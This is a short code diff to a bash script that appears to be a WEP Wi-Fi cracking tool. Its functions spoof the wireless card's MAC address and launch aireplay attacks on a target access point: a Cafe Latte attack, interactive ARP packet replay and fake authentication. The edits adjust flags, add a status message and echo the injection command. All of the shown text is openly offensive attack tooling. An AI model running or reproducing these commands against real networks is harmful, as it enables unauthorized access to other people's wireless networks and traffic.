@@ -26,6 +26,7 @@ check_client(){
 		directed=1; 
 		return 0; 
 	} || {
+		directed=0;
 		ifconfig $wificard hw ether $FAKE_MAC
 	}
 }
@@ -71,6 +72,7 @@ wep_attacks(){
 		capture &
 	 }
     wep_attacks_$attack $@
+	notification="Attack launched, see window menu"
     $clear;
 }
 interactive_wep(){
@@ -87,6 +89,8 @@ wep_attacks_caffelate(){
 	execute  $"Cafe Latte Attack on: $Host_SSID "\
 	   	$AIREPLAY -6 -b $Host_MAC -h $FAKE_MAC -x \
 		$INJECTRATE -D $iwifi & 
+
+	read -p "$AIREPLAY -6 -b $Host_MAC -h $FAKE_MAC -x $INJECTRATE -D $iwifi"
 	auth_attacks_fake 
 }
 
@@ -96,7 +100,7 @@ wep_attacks_arpreplay_interactive(){
     if [[ $directed == 1 ]]; then
 		execute $"Interactive Packet Sel on: $Host_SSID" $AIREPLAY $iwifi --interactive -p $FT -c $INJMAC -b $Host_MAC -h $Client_MAC -x $INJECTRATE 
 	else
-		auth_attacks_fake &
+		auth_attacks_fake 1 &
 		execute $"Interactive Packet Sel on: $Host_SSID" $AIREPLAY $iwifi --interactive -p $FT -c $INJMAC -b $Host_MAC -h $FAKE_MAC -x $INJECTRATE 
 	fi
 }
